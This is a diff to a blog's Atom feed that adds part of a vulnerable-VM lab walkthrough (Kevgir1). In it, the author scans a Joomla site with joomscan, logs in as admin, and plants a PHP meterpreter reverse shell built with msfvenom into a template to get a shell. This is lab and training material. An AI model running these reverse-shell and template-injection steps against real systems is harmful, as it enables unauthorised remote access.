@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-05-04T13:48:13-05:00</updated>
+  <updated>2016-05-04T16:24:09-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -26,6 +26,8 @@
 <li>netdiscover</li>
 <li>Nmap</li>
 <li>hydra</li>
+<li>msfvenom</li>
+<li>joomscan</li>
 </ul>
 
 
@@ -150,6 +152,40 @@ jar -cvf ../webshell.war *</p>
 <p>DONE for Tomcat</p>
 
 <p>Now move to port 8081</p>
+
+<p><img src="/images/blog/vulhub/kevgir1/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Its Joomla!.</p>
+
+<p>use tool <code>joomscan</code> to scan it</p>
+
+<p><code>joomscan -u http://192.168.79.174:8081</code></p>
+
+<p><img src="/images/blog/vulhub/kevgir1/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the version of joomla!</p>
+
+<p>Now find out the vulnerability:</p>
+
+<p><img src="/images/blog/vulhub/kevgir1/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>follow the instructions of this vulnerability.</p>
+
+<p>login as admin:</p>
+
+<p><img src="/images/blog/vulhub/kevgir1/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>create php reverse shell:</p>
+
+<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.173 LPORT=6666 -e php/base64 -f raw &gt; shell.php</code></p>
+
+<p>In Extension ->Template Manager, edit existing template. Copy the content of the shell.php to it and don&rsquo;t forgot to add &lt;?php and ?>.</p>
+
+<p><img src="/images/blog/vulhub/kevgir1/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>set up the netcat and preview the page. get the shell</p>
+
+<p><img src="/images/blog/vulhub/kevgir1/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
